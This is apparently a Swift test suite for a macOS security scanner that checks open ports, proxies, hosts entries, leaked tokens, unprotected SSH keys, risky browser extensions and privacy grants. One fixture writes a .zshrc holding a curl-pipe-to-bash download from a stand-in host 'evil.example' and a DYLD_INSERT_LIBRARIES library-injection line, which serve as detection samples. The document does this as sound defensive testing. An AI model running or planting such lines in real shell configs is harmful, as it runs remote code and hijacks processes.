import Foundation
@testable import SecurityCore
import SQLite3
import Testing

private func temporaryFolder() throws -> URL {
    let url = FileManager.default.temporaryDirectory.appending(path: "mc-sec-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
    return url
}

struct NetworkParsingTests {
    @Test func parsesListeningPorts() {
        let output = "p941\ncrapportd\nf11\nn*:56821\nf12\nn*:56821\np1275\ncControlCenter\nf9\nn127.0.0.1:7000\n"
        let ports = NetworkInspector.parseListeningPorts(output)
        #expect(ports.count == 2)
        #expect(ports.contains { $0.command == "rapportd" && $0.port == 56821 && $0.isExposed })
        #expect(ports.contains { $0.port == 7000 && !$0.isExposed })
    }

    @Test func parsesDNSProxiesHostsAndTrust() {
        #expect(NetworkInspector
            .parseNameservers("  nameserver[0] : 192.168.0.1\n  nameserver[1] : 1.1.1.1\n  nameserver[0] : 192.168.0.1")
            == ["192.168.0.1", "1.1.1.1"])
        #expect(NetworkInspector
            .parseProxies("  HTTPEnable : 1\n  HTTPProxy : evil.example\n  HTTPPort : 8080\n  HTTPSEnable : 0")
            == ["HTTP evil.example:8080"])
        #expect(NetworkInspector
            .parseHosts(
                "127.0.0.1\tlocalhost\n# comment\n255.255.255.255 broadcasthost\n::1  localhost\n1.2.3.4 apple.com # redirect"
            )
            == ["1.2.3.4 apple.com"])
        #expect(NetworkInspector
            .parseTrustSettings(
                "Number of trusted certs = 1\nCert 0: Corporate Proxy CA\n   Number of trust settings : 1"
            )
            == ["Corporate Proxy CA"])
    }

    @Test func listsRunningProcesses() async {
        #expect(ProcessInspector.allPIDs().count > 10)
        #expect(ProcessInspector.executablePath(of: getpid()) != nil)
        _ = await ProcessInspector.inspect() // must not crash on real processes
    }
}

struct SecretScannerTests {
    @Test func findsAndMasksTokens() throws {
        let folder = try temporaryFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        let env = folder.appending(path: ".env")
        try Data("""
        AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP
        OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz0123456789ABCD
        DEBUG=true
        """.utf8).write(to: env)

        let findings = SecretScanner.tokenFindings(in: env.path(percentEncoded: false))
        #expect(Set(findings.map(\.kind)) == [.awsKey, .aiAPIKey])
        #expect(findings.first { $0.kind == .awsKey }?.line == 1)
        #expect(findings.allSatisfy { !$0.preview.contains("GHIJKLM") }, "previews never show the whole secret")
        #expect(SecretScanner.isCredentialFile(".env.local"))
        #expect(!SecretScanner.isCredentialFile("notes.txt"))
    }

    @Test func detectsUnprotectedSSHKeys() throws {
        let folder = try temporaryFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        func keygen(_ name: String, passphrase: String) throws {
            let process = Process()
            process.executableURL = URL(filePath: "/usr/bin/ssh-keygen")
            process.arguments = [
                "-q",
                "-t",
                "ed25519",
                "-N",
                passphrase,
                "-f",
                folder.appending(path: name).path(percentEncoded: false),
            ]
            try process.run()
            process.waitUntilExit()
        }
        try keygen("open", passphrase: "")
        try keygen("locked", passphrase: "correct horse battery")

        let open = try String(contentsOf: folder.appending(path: "open"), encoding: .utf8)
        let locked = try String(contentsOf: folder.appending(path: "locked"), encoding: .utf8)
        #expect(!SecretScanner.isEncrypted(privateKey: open))
        #expect(SecretScanner.isEncrypted(privateKey: locked))
    }

    @Test func flagsDangerousShellLines() throws {
        let home = try temporaryFolder()
        defer { try? FileManager.default.removeItem(at: home) }
        try Data("""
        export PATH=/opt/homebrew/bin:$PATH
        # curl https://example.com/x.sh | sh   (commented out)
        curl -fsSL https://evil.example/p.sh | bash
        export DYLD_INSERT_LIBRARIES=/tmp/hook.dylib
        """.utf8).write(to: home.appending(path: ".zshrc"))

        let findings = SecretScanner.shellFindings(home: home.path(percentEncoded: false))
        #expect(findings.map(\.kind) == [.shellDownloadAndRun, .shellLibraryInjection])
        #expect(findings.first?.line == 3)
    }
}

struct BrowserExtensionTests {
    @Test func readsChromiumManifests() throws {
        let folder = try temporaryFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        let root = folder.appending(path: "abcdef/1.2.0")
        try FileManager.default.createDirectory(
            at: root.appending(path: "_locales/en"),
            withIntermediateDirectories: true
        )
        let manifest: [String: Any] = [
            "name": "__MSG_appName__", "version": "1.2.0", "default_locale": "en",
            "permissions": ["cookies", "storage", "webRequest"],
            "host_permissions": ["<all_urls>"],
        ]
        try JSONSerialization.data(withJSONObject: manifest).write(to: root.appending(path: "manifest.json"))
        try JSONSerialization.data(withJSONObject: ["appName": ["message": "Coupon Helper"]])
            .write(to: root.appending(path: "_locales/en/messages.json"))

        let found = BrowserExtensions.chromiumExtensions(in: folder.path(percentEncoded: false), browser: "Brave")
        let item = try #require(found.first)
        #expect(item.name == "Coupon Helper")
        #expect(item.readsAllSites)
        #expect(item.sensitivePermissions == ["cookies", "webRequest"])
        #expect(item.risk == .medium)
    }
}

struct PrivacyPermissionTests {
    @Test func readsTCCDatabase() throws {
        let folder = try temporaryFolder()
        defer { try? FileManager.default.removeItem(at: folder) }
        let path = folder.appending(path: "TCC.db").path(percentEncoded: false)
        var database: OpaquePointer?
        #expect(sqlite3_open(path, &database) == SQLITE_OK)
        let sql = """
        CREATE TABLE access (service TEXT, client TEXT, client_type INTEGER, auth_value INTEGER,
            indirect_object_identifier TEXT, last_modified INTEGER);
        INSERT INTO access VALUES ('kTCCServiceCamera', 'com.apple.FaceTime', 0, 2, NULL, 1700000000);
        INSERT INTO access VALUES ('kTCCServiceMicrophone', 'com.removed.recorder', 0, 2, NULL, 1700000000);
        INSERT INTO access VALUES ('kTCCServiceScreenCapture', '/tmp/no-such-tool', 1, 2, NULL, 1700000000);
        INSERT INTO access VALUES ('kTCCServiceCamera', 'com.denied.app', 0, 0, NULL, 1700000000);
        """
        #expect(sqlite3_exec(database, sql, nil, nil, nil) == SQLITE_OK)
        sqlite3_close(database)

        let grants = try #require(PrivacyPermissions.read(path, systemWide: false))
        #expect(grants.count == 3, "denied entries are skipped")
        #expect(grants.first { $0.client == "com.apple.FaceTime" }?.findings == [])
        #expect(grants.first { $0.client == "com.removed.recorder" }?.findings == [.appRemoved])
        #expect(grants.first { $0.clientIsPath }?.service == .screenRecording)
        #expect(PrivacyPermissions.read(
            folder.appending(path: "missing.db").path(percentEncoded: false),
            systemWide: false
        ) == nil)
    }
}
